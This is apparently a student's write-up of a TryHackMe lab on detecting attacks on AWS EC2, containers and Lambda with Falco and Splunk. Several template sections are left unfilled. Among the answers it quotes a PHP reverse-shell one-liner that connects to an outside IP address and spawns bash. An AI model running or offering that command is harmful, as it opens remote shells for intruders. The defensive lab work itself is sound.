# [Cloud Security for SOC]

**TryHackMe Path**: [SOC Level 2]  
**Lab Topic**: [Monitoring AWS Workloads]  
**Date Completed**: [11//2026]

**Lab Link**: [https://tryhackme.com/room/monitoringawsworkloads]

---

## 🧠 Summary

> In this lab, 

---

## 🎯 Objectives

- [ ] 

---


## 🧰 Tools Used
- THM AttackBox
- Splunk

---

## 📊 Analysis & Screenshots

*** Falco for EC2 ***

> For this section of the lab, i was tasked with analyzing the format in which Falco records raw events and high-level alerts within a Splunk instance, then was tasked to answer a
select set of questions. For the first question i had to figure out when wasMorgan Blake's local password changed after investigating the low-level Falco events coming from ec2-demo.
Upon further further investigation i was able to identify the change at:
2026-01-14 23:44:19
>
> <img width="659" height="434" alt="1" src="https://github.com/user-attachments/assets/79c7ea1b-156c-4a03-8ab2-2b2497d7439b" />
> <img width="917" height="468" alt="2" src="https://github.com/user-attachments/assets/8af9e608-5df5-436f-b992-5669930cd916" />
> <img width="906" height="719" alt="3" src="https://github.com/user-attachments/assets/519d656e-2b75-4ab1-8c06-caf78c4f9ddc" />

> I then identified the Github repository name Morgan cloned to the VM was:
react-boilerplate
>
> <img width="752" height="385" alt="4" src="https://github.com/user-attachments/assets/2d654b27-e664-4649-9c07-d3018fe2702d" />
> <img width="739" height="664" alt="5" src="https://github.com/user-attachments/assets/59a56a76-1b41-4a42-89d4-c6e28186b0cd" />

> After switching to the high-level alerts that was coming from srv-prodgw, i was able to identify the rule that triggered the alert shown to be:
Search Private Keys or Passwords
>
> <img width="1293" height="934" alt="6" src="https://github.com/user-attachments/assets/50793f89-6af3-43a4-8267-9a5a6ccbd479" />

*** Falco for Containers ***

> Moving onto this section, i then had to investigate a a container breach through a vulnerable web app within the Splunk instance, then answer a select set of questions. For the
first question, i had to figure out which two containers were visible within the Falco logs. Upon further investigation i was able to identify the two containers to be:
thm-db, thm-web
>
> <img width="633" height="606" alt="7" src="https://github.com/user-attachments/assets/d4ffec4e-84c1-45f8-93b7-b9fd471d6087" />
> <img width="1051" height="489" alt="8" src="https://github.com/user-attachments/assets/06ad9989-3837-4345-92cb-4ea5f6461ecc" />

> I then identified the container image that the web containers uses to be:
thm/website:latest
>
> <img width="1020" height="945" alt="9" src="https://github.com/user-attachments/assets/dc3acc86-801c-49c6-90e2-579883a04017" />

> The absolute path to the Apache web server was discovered to be:
/usr/sbin/apache2
>
> <img width="748" height="366" alt="10" src="https://github.com/user-attachments/assets/431c5dfb-dfe4-47a8-92be-94b448936aaa" />
> <img width="1559" height="827" alt="11" src="https://github.com/user-attachments/assets/dd43f53d-9a20-4c9f-825e-636ff6ec029f" />

> The first Discovery command that was executed through the web was identified as:
whoami
>
> <img width="909" height="395" alt="12" src="https://github.com/user-attachments/assets/52175beb-35ca-4b42-9635-18274af75af1" />
> <img width="876" height="669" alt="13" src="https://github.com/user-attachments/assets/3cb196e7-e78b-4095-b70d-082df4adc477" />

> The command that allowed the attacker to open a reverse shell was discovered to be:
php -r '$sock=fsockopen("115.190.98.228",9999);exec("bash <&3 >&3 2>&3");'
>
> <img width="1292" height="785" alt="14" src="https://github.com/user-attachments/assets/fd6d9361-1389-48c8-b5ff-6da4331d4990" />

*** AWS Lambda Throry ***

> For this section, i was tasked to explore the lambda events coming from the img-processor function within the Splunk instance, then answer a select set of questions. For the first
question i had to figure out the role that was assigned to the function during its creation. Upon further investigation the role that was assigned was identified to be:
img-processor-role-ztpjz457
>
> <img width="1206" height="986" alt="15" src="https://github.com/user-attachments/assets/d72c015f-5771-4963-897d-5f746ea648f0" />

> The function's codeSha256 after the change in its code was identifed as:
JM6U2MB9wb7p738MMZzcISed6lXCRm0GNHS0eK0UpZQ=
>
> <img width="1047" height="856" alt="16" src="https://github.com/user-attachments/assets/529d0c58-d636-42b0-8472-6c0814b9415a" />

> The role of the function was changed. The name of the new execution role was identified as:
ImageProcessorRole
>
> <img width="742" height="239" alt="17" src="https://github.com/user-attachments/assets/6dd06cbe-2efa-416a-898a-33ee8557dc95" />

> The function was then made publicly accessible. The CloudTrail event that confirms this misconfiguration was identified as:
AddPermission20150331v2
>
> <img width="1492" height="1055" alt="18" src="https://github.com/user-attachments/assets/da86d28f-64df-4f25-895b-cd57764582d9" />

*** AWS Lambda Practice ***

> For this final section, i was tasked to investigate index=task7 within the Splunk instance, then to answer a select set of questions. For the first question, i had to figure out
what user and access key interacted with the Lambda service. Upon further investigation i was able to identify both the user and access key to be:
carl.brown, AKIAVZZK4G6EZH7GIZY3
>
> <img width="909" height="448" alt="19" src="https://github.com/user-attachments/assets/de1cfd59-5896-4c1a-911a-34108bf5e6b3" />
> <img width="1060" height="511" alt="20" src="https://github.com/user-attachments/assets/be8bfd3e-f896-45e5-a15f-6ee8f54cc609" />

> The attacker then overwrote the Lambda code with the malicious code. The size of the uploaded Python code was discovered to be:
1837
>
> <img width="1011" height="657" alt="21" src="https://github.com/user-attachments/assets/39dff18b-5c7e-4c9c-8916-283b8dd8e19a" 
> <img width="1296" height="640" alt="23" src="https://github.com/user-attachments/assets/90c77116-d39f-4558-bc9f-b0c3acbc320a" />

> The malicious code then started two EC2 instances. Which was later identified to be:
i-054e705408f5fa5de, i-056219235e66e3f94
>
> <img width="1341" height="896" alt="24" src="https://github.com/user-attachments/assets/24777ca3-0d78-406b-b928-2c464e12d354" />
> <img width="1223" height="752" alt="25" src="https://github.com/user-attachments/assets/7bf7a296-b28a-4154-88a7-4b7762696209" />

> The code was then updated again to install cryptominers on EC2 via SSM. The SSM "DocumentName" the attacker used to install malware was identified to be:
AWS-RunShellScript
>
> <img width="1073" height="666" alt="27" src="https://github.com/user-attachments/assets/fb81fc3a-12e6-4178-9aa2-cac22c47a9ba" />

> Finally, the user-agent that was used by Lambda to run the malicious code was identified to be:
Boto3/1.40.4
>
> <img width="570" height="323" alt="26" src="https://github.com/user-attachments/assets/cd1a8309-bce4-49fa-b275-33279aa1e9e4" />
---

## Reflection

> 
